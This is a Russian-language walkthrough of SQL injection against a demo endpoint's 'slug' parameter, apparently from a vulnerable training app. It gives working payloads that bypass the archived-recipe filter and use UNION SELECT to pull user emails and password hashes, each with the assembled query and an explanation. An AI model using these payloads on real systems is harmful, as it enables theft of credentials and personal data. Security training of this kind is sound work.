## GET `/api/v1/admin/sql-demo/recipe/{slug}` — параметр `slug`

### Обойти поиск по slug и увидеть рецепты, включая архивные

```sql
' OR TRUE -- 
```

Итоговый склеенный запрос:

```sql
SELECT id, title, slug FROM public.recipes WHERE slug = '' OR TRUE -- ' AND archived=false
```

Почему работает:

- `'` закрывает строковое значение `slug`.
- `OR TRUE` делает условие истинным для каждого рецепта.
- `--` комментирует остаток строки, включая проверку `archived=false`.

Поэтому запрос выбирает любые рецепты, включая архивные.

### Получить email пользователей

```sql
' AND FALSE UNION SELECT id,email,'user' FROM public.users -- 
```

Итоговый склеенный запрос:

```sql
SELECT id, title, slug FROM public.recipes WHERE slug = '' AND FALSE UNION SELECT id,email,'user' FROM public.users -- ' AND archived=false
```

Почему работает:

- `'` закрывает значение `slug`.
- `AND FALSE` исключает рецепты из результата.
- `UNION SELECT` добавляет данные из таблицы `users`.
- `--` комментирует оставшуюся часть исходного запроса.

Оба SELECT возвращают три совместимых столбца. Имена полей результата берутся из первого SELECT, а значения — из второго:

| Поле ответа | Содержимое |
|---|---|
| `id` | ID пользователя |
| `title` | Email пользователя |
| `slug` | Текст `user` |

### Получить email и хеши паролей

Введите:

```sql
' AND FALSE UNION SELECT id,email,password_hash FROM public.users -- 
```

Итоговый склеенный запрос:

```sql
SELECT id, title, slug FROM public.recipes WHERE slug = '' AND FALSE UNION SELECT id,email,password_hash FROM public.users -- ' AND archived=false
```

Почему работает: механизм такой же, как в предыдущем примере, но вместо текста `user` третий столбец содержит `password_hash`. Его строковый тип совместим с типом `slug`.

| Поле ответа | Содержимое |
|---|---|
| `id` | ID пользователя |
| `title` | Email пользователя |
| `slug` | Хеш пароля |
